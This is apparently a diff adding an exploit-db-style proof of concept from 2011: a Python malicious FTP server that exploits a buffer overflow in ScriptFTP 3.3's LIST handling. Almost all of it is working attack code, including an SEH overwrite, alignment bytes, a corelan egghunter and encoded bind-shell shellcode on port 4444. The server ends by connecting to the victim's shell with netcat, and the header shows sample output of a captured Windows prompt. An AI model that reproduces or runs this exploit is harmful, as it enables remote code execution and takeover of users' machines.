@@ -1,0 +1,233 @@
+# Exploit Title: ScriptFTP <=3.3 Remote Buffer Overflow (LIST)
+# Date: September 20, 2011
+# Author: modpr0be
+# Software Link: http://www.scriptftp.com/ScriptFTP_3_3_setup.exe
+# Version: 3.3
+# Tested on: Windows XP SP3, Windows Server 2003 SP1 (SE) (VMware 3.1.4 build-385536)
+# CVE : -
+#
+# Thanks: offsec, exploit-db, corelanc0d3r, 5M7X, loneferret, mr_me, _sinner
+# 
+# You should create your own script to work with ScriptFTP
+# for example; enable passive and get the remote directory 
+# on your evil ftp server.
+#
+# my example script:
+# OPENHOST("8.8.8.8","ftp","ftp")
+# SETPASSIVE(ENABLED)
+# GETLIST($list,REMOTE_FILES)
+# CLOSEHOST
+# save it to a file with .ftp extension (eg: exploit.ftp)
+
+# root@bt :/# python scriptftp-bof-poc.py
+# [*] ScriptFTP 3.3 Remote Buffer Overflow POC
+# [*] by modpr0be[at]digital-echidna[dot]org.
+# [*] thanks a lot to cyb3r.anbu | otoy :)
+# =============================================
+# [*] Evil FTP Server Ready
+# [*] Server initiated.
+# [*] Awaiting connection...
+# [*] Connection created by 172.16.87.129.
+# [*] Establishing session.
+# [*] Pwning in progress..
+# [*] This may take up 50 seconds or less.
+# [!] Hunter is hunting the Egg ;)
+# [!] Waiting for a shell..
+# [!] 0wn3d..!
+#
+# Microsoft Windows XP [Version 5.1.2600]
+# (C) Copyright 1985-2001 Microsoft Corp.
+#
+# C:\Program Files\ScriptFTP>
+#
+# Yes, this poc is using PASSIVE connection and it will
+# take some time to establish. I love the way we wait for a shell ;)
+
+#!/usr/bin/python
+
+import socket
+import os
+import sys
+import time
+
+class ftp_server:
+    def __init__(self):
+        self.host = '0.0.0.0'
+        self.passive_port = 7214
+        self.log("""
+[*] ScriptFTP <=3.3 Remote Buffer Overflow POC
+[*] by modpr0be[at]digital-echidna[dot]org
+[*] thanks a lot to cyb3r.anbu | otoy :)
+=============================================
+[*] Evil FTP Server Ready""")
+
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.bind(('', 21))
+        self.sock.listen(1)
+
+        a = self.passive_port/256
+        b = self.passive_port%256
+        self.tuple_port = (a, b)
+        self.host_join = ','.join(self.host.split('.'))
+        self.passive = False
+
+        self.log("[*] Server initiated.")
+
+    def log(self, msg):
+        print msg
+
+    def get(self):
+        return self.conn.recv(1024).replace('\r', '').replace('\n', '')
+
+    def getcwd(self):
+        return os.getcwd().split(chr(92))[-1]
+    
+    def put(self, ftr):
+        x = {
+
+            150:" Data connection accepted from %s:%s; transfer starting.\r\n226 Listing completed."%(self.host, self.passive_port),
+            200:" Type okay.",
+            220:" %s Server is ready."%self.host,
+            226:" Listing completed.",
+            227:" Entering Passive Mode (%s,%s,%s)"%(self.host_join, self.tuple_port[0], self.tuple_port[1]),
+            230:" User logged in, proceed.",
+            250:' "/%s" is new cwd.'%self.getcwd(), 
+            257:' "/%s" is cwd.'%self.getcwd(),
+            331:" User name okay, need password.",
+            502:" Command not implemented.",
+            551:" Requested action aborted. Page type unknown."      
+
+                   }[ftr]
+
+        s = '%s%s\r\n'%(ftr, x)
+        self.conn.send(s)
+        return s
+
+    def main(self):
+        self.log("[*] Awaiting connection...")
+        self.conn, addr = self.sock.accept ()
+        self.log("[*] Connection created by %s.\n[*] Establishing session."%addr[0])
+	self.put(220)
+        self.log("[*] Pwning in progress..")
+	self.log("[*] This may take up 50 seconds or less.")
+
+        while 1:
+            try: 
+                data = self.get().upper()
+            except socket.error:
+                self.conn.close()
+                self.sock.shutdown(socket.SHUT_RDWR)
+                raise socket.error
+	    
+            if data[:4] == 'USER':   s = 331
+            elif data[:4] == 'PASS': s = 230
+            elif data[:3] == 'PWD':  s = 257
+            elif data[:4] == 'TYPE': s = 200
+            elif data[:4] == 'PASV':
+                # create passive port
+                self.sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.sock2.bind(('', self.passive_port ))
+                self.sock2.listen(1)
+                s = self.put(227)
+                self.conn2, addr = self.sock2.accept()
+                self.passive = True
+                s = 0 # don't routine
+      
+            elif data[:3] == 'CWD':
+                try:
+                    os.chdir('..%s'%data.split(' ')[-1])
+                    s = 250
+                except OSError:
+                    s = 551
+		    
+            elif data[:4] == 'LIST':
+                s = self.put(150)
+                s = self.passive_do(1)
+                s = 0 # don't routine
+		print "[!] Hunter is hunting the Egg ;)"
+		time.sleep(50)
+		print "[!] Waiting for a shell.."
+		time.sleep(2)
+		print "[!] 0wn3d..!\n"
+		os.system("nc %s 4444"%addr[0])
+		sys.exit()
+            else:
+		s = 502
+
+            if s:
+                s = self.put(s)
+
+    def passive_do(self, id):
+        if id == 1:
+	    #bind to port 4444
+	    bind = ("PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQ"
+                    "APA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1A"
+                    "IQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLI"
+                    "XTIKPKPKPC0DIZENQXRS4DK0RNPTKPRLLTKR2LTTKBRO"
+                    "8LOVWPJMVNQKONQGPFLOL1Q3LLBNLMPY18OLMM1I7K2J"
+                    "P0RR74KPRN0DKOROLKQZ0DKOPRX4EY0RTPJKQXP0PTK1"
+                    "8N8DKQHMPKQHSJCOLOYTKODDKM1HVNQKONQY0VLWQHOL"
+                    "MKQWWP8IPCEL4LCSML8OK3MMTRUK2R84KQHMTM1YCQV4"
+                    "KLLPKTKPXMLKQZ3TKM4TKKQ8P4IQ4O4MTQKQK1QPYPZ2"
+                    "1KOK0PXQO1J4KN2ZKU61MQXNSP2KPKPS82W2SP21OQD3"
+                    "80LSGNFLGKOZ56X4PM1KPKPO9XDPTPPQXNI3P2KM0KOX"
+                    "U0PPPPP0POP0POPPPQXJJLOIOYPKOJ5SYGWNQIKPSBHM"
+                    "2KPN1QLU9YVRJLPQFQGC8GRIK07QWKO8U0SR7C87GZIP"
+                    "8KOKOJ50SR3PWRHCDZLOKYQKO8UPW5997QX2URN0MQQK"
+                    "OYEQX33BMQTKPSYJCPWPWR701JV2JMBR926IRKMQVGWO"
+                    "TMTOLKQKQTMPDNDLP7VKPQ40TB0PVPVPVOV26PNQFR6P"
+                    "SR6C8SIXLOOTFKOXUCY9P0N0VPFKONPS8KXSWMMQPKO9"
+                    "E7KL0X5W2QFQXVFTUWMEMKOHUOLKV3LKZU0KKYP2ULEW"
+                    "KQ7MCT2BO2JKPQCKOZ5A")
+	    
+	    # 32bit egghunter from corelanc0d3r, thx ;)
+	    egghunter = ("PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYA"
+			 "IAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA5"
+			 "8AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZB"
+			 "ABABABAB30APB944JBQVCQGZKOLO12PRQZKR1"
+			 "HXMNNOLKUQJRTJO6XKPNPKP44TKJZ6O3EJJ6O"
+			 "SEYWKOYWA")
+				   
+	    junk = "A" * 1746		#junk
+	    nseh = "\x61\x62"		#nseh
+            seh = "\x45\x5B" 		#seh ppr somewhere on scriptftp dir 
+            
+	    #prepare for align
+            align = "\x60"			#pushad
+	    align += "\x73"			#nop/align
+	    align += "\x53"			#push ebx
+	    align += "\x73"			#nop/align
+            align += "\x58"			#pop eax
+	    align += "\x73"			#nop/align
+	    align += "\x05\x02\x11"     	#add eax,0x11000200
+	    align += "\x73"             	#nop/align
+            align += "\x2d\x01\x11"     	#sub eax,0x11000120
+	    align += "\x73"             	#nop/align
+	    
+	    #walking
+   	    walk = "\x50"			#push eax
+	    walk += "\x73"			#nop/align
+	    walk += "\xc3"			#ret
+    
+	    #align again
+	    align2 = "0t0t" + "\x73\x57\x73\x58\x73"		#nop/push edi/nop/pop eax/nop
+	    align2 += "\xb9\x1b\xaa"			#mov ecx,0xaa001b00
+	    align2 += "\xe8\x73"			#add al,ch + nop
+	    align2 += "\x50\x73\xc3"			#push eax,nop,ret
+
+	    sampah1 = "\x44" * 106 + "\x73"		#eax+106/align nop
+	    sampah2 = "\x42" * 544			#right after shellcode
+	    
+	    crash = junk+nseh+seh+align+walk+sampah1+egghunter+sampah2+align2+bind+sampah1
+
+            res = """-rwxr-xr-x   5 ftpuser  ftpusers       512 Jul 26  2001 """+crash+""".txt\r\ndrwxr-xr-x   5 ftpuser  ftpusers       512 Jul 26  2001 A\r\nrwxr-xr-x   5 ftpuser  ftpusers       512 Jul 26  2001 """+ crash +".txt\r\n"
+
+        self.conn2.send(res)
+        # self.conn2.send('\r\n') # send blank
+	return res
+
+try:
+	ftp_server().main()
+except socket.error:
+        print "[!] Socket is not ready, shutting down...\n"
+
